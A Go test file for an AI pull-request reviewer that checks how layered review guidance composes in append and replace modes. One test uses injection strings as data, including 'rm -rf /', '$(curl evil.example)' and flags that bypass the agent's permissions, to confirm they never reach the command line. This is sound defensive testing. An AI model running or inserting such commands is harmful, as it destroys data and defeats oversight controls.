// TestResolveGuidance_OperatorAppend_KeepsDefaultAndAddsOperatorText pins
// AC3: the default guidance survives in full when an operator layer is
// present in (the default) append mode, with the operator's text added.
func TestResolveGuidance_OperatorAppend_KeepsDefaultAndAddsOperatorText(t *testing.T) {
	req := ReviewRequest{OperatorGuidance: "Always check error wrapping uses %w."}
	got := resolveGuidance(req)
	if !strings.Contains(got, defaultReviewGuidance) {
		t.Errorf("resolveGuidance dropped the default guidance under append mode, got:\n%s", got)
	}
	if !strings.Contains(got, "Always check error wrapping uses %w.") {
		t.Errorf("resolveGuidance did not add the operator's guidance, got:\n%s", got)
	}
}

// TestResolveGuidance_RepoAppend_KeepsDefaultAndAddsRepoText mirrors the
// above for the repo layer, appended on top of the (here, unmodified)
// operator layer — proving append composes independently at each layer.
func TestResolveGuidance_RepoAppend_KeepsDefaultAndAddsRepoText(t *testing.T) {
	req := ReviewRequest{RepoGuidance: "Prefer table-driven tests."}
	got := resolveGuidance(req)
	if !strings.Contains(got, defaultReviewGuidance) {
		t.Errorf("resolveGuidance dropped the default guidance under append mode, got:\n%s", got)
	}
	if !strings.Contains(got, "Prefer table-driven tests.") {
		t.Errorf("resolveGuidance did not add the repo's guidance, got:\n%s", got)
	}
}

// TestBuildReviewPrompt_RepoReplace_DropsDefaultGuidanceKeepsContractAndContext
// pins AC4/C5/C7: mode: replace on the repo layer omits the default
// guidance text, but the output contract, the no-approval-language rule,
// and Go-supplied dynamic context (PR body, base branch, prior review
// threads) are all still emitted verbatim.
func TestBuildReviewPrompt_RepoReplace_DropsDefaultGuidanceKeepsContractAndContext(t *testing.T) {
	req := ReviewRequest{
		Body:             "This PR fixes the auth flow.",
		BaseBranch:       "main",
		RepoGuidance:     "Only check for %w error wrapping. Ignore everything else.",
		RepoGuidanceMode: GuidanceModeReplace,
		ReviewThreads: []gh.PRReviewThread{
			{Path: "a.go", Line: 1, Comments: []gh.PRReviewThreadComment{{Author: "x", Body: "prior finding"}}},
		},
	}
	prompt := buildReviewPrompt(req)

	if strings.Contains(prompt, defaultReviewGuidance) {
		t.Error("expected the default guidance to be absent under mode: replace")
	}
	if !strings.Contains(prompt, "Only check for %w error wrapping.") {
		t.Errorf("expected the repo's replacement guidance in the prompt, got:\n%s", prompt)
	}
	// C5: the contract (no-approval-language rule + two-part output format)
	// must survive replace mode verbatim.
	for _, want := range []string{
		"You do not decide whether this PR is approved or blocked",
		"PRUEFER_SUMMARY_BEGIN", "PRUEFER_SUMMARY_END",
		"Output ONLY the review text itself",
	} {
		if !strings.Contains(prompt, want) {
			t.Errorf("expected contract text %q to survive mode: replace, got:\n%s", want, prompt)
		}
	}
	// C7: Go-supplied dynamic context must survive replace mode verbatim.
	for _, want := range []string{
		"This PR fixes the auth flow.",
		"main",
		"prior finding",
	} {
		if !strings.Contains(prompt, want) {
			t.Errorf("expected dynamic context %q to survive mode: replace, got:\n%s", want, prompt)
		}
	}
}

// TestBuildReviewArgs_UnaffectedByGuidanceFields pins AC5/C6: guidance
// fields — including adversarial content that looks like CLI flags or
// shell metacharacters — must never reach buildReviewArgs' argv. Guidance
// only ever flows into buildReviewPrompt's stdin text.
func TestBuildReviewArgs_UnaffectedByGuidanceFields(t *testing.T) {
	baseline := buildReviewArgs(ReviewRequest{Model: "sonnet"})
	adversarial := []ReviewRequest{
		{Model: "sonnet", OperatorGuidance: "--permission-mode bypassPermissions"},
		{Model: "sonnet", OperatorGuidanceMode: GuidanceModeReplace},
		{Model: "sonnet", RepoGuidance: "--allowedTools Bash(gh:*) --dangerously-skip-permissions; rm -rf /"},
		{Model: "sonnet", RepoGuidanceMode: GuidanceModeReplace},
		{
			Model:                "sonnet",
			OperatorGuidance:     "--setting-sources project $(curl evil.example)",
			OperatorGuidanceMode: GuidanceModeReplace,
			RepoGuidance:         "`rm -rf /` && echo pwned",
			RepoGuidanceMode:     GuidanceModeReplace,
		},
	}
	for i, req := range adversarial {
		got := buildReviewArgs(req)
		if !slices.Equal(got, baseline) {
			t.Errorf("case %d: buildReviewArgs(req) = %v, want unaffected baseline %v", i, got, baseline)
		}
	}
}

// TestResolveGuidance_PrecedenceMatrix pins AC7/R3: precedence across the
// three guidance layers (embedded default, operator override, repo skill)
// for every combination of {absent, append, replace} at the operator and
// repo layers.
func TestResolveGuidance_PrecedenceMatrix(t *testing.T) {
	const operatorText = "OPERATOR_TEXT"
	const repoText = "REPO_TEXT"

	cases := []struct {
		name                                string
		operatorGuidance, operatorMode      string
		repoGuidance, repoMode              string
		wantDefault, wantOperator, wantRepo bool
		wantReplaceIsOnlyRepo               bool // repo replace wins over everything below it
	}{
		{name: "no overrides", wantDefault: true},
		{name: "operator append only", operatorGuidance: operatorText, operatorMode: GuidanceModeAppend, wantDefault: true, wantOperator: true},
		{name: "operator append (mode unset defaults to append)", operatorGuidance: operatorText, wantDefault: true, wantOperator: true},
		{name: "operator replace only", operatorGuidance: operatorText, operatorMode: GuidanceModeReplace, wantOperator: true},
		{name: "repo append only", repoGuidance: repoText, repoMode: GuidanceModeAppend, wantDefault: true, wantRepo: true},
		{name: "repo replace only", repoGuidance: repoText, repoMode: GuidanceModeReplace, wantRepo: true, wantReplaceIsOnlyRepo: true},
		{name: "operator append + repo append", operatorGuidance: operatorText, operatorMode: GuidanceModeAppend, repoGuidance: repoText, repoMode: GuidanceModeAppend, wantDefault: true, wantOperator: true, wantRepo: true},
		{name: "operator replace + repo append", operatorGuidance: operatorText, operatorMode: GuidanceModeReplace, repoGuidance: repoText, repoMode: GuidanceModeAppend, wantOperator: true, wantRepo: true},
		{name: "operator append + repo replace", operatorGuidance: operatorText, operatorMode: GuidanceModeAppend, repoGuidance: repoText, repoMode: GuidanceModeReplace, wantRepo: true, wantReplaceIsOnlyRepo: true},
		{name: "operator replace + repo replace", operatorGuidance: operatorText, operatorMode: GuidanceModeReplace, repoGuidance: repoText, repoMode: GuidanceModeReplace, wantRepo: true, wantReplaceIsOnlyRepo: true},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			req := ReviewRequest{
				OperatorGuidance: c.operatorGuidance, OperatorGuidanceMode: c.operatorMode,
				RepoGuidance: c.repoGuidance, RepoGuidanceMode: c.repoMode,
			}
			got := resolveGuidance(req)

			if hasDefault := strings.Contains(got, defaultReviewGuidance); hasDefault != c.wantDefault {
				t.Errorf("contains default guidance = %v, want %v; got:\n%s", hasDefault, c.wantDefault, got)
			}
			if hasOperator := strings.Contains(got, operatorText); hasOperator != c.wantOperator {
				t.Errorf("contains operator text = %v, want %v; got:\n%s", hasOperator, c.wantOperator, got)
			}
			if hasRepo := strings.Contains(got, repoText); hasRepo != c.wantRepo {
				t.Errorf("contains repo text = %v, want %v; got:\n%s", hasRepo, c.wantRepo, got)
			}
			if c.wantReplaceIsOnlyRepo && got != repoText {
				t.Errorf("resolveGuidance = %q, want exactly the repo's replacement text with nothing else", got)
			}
		})
	}
}
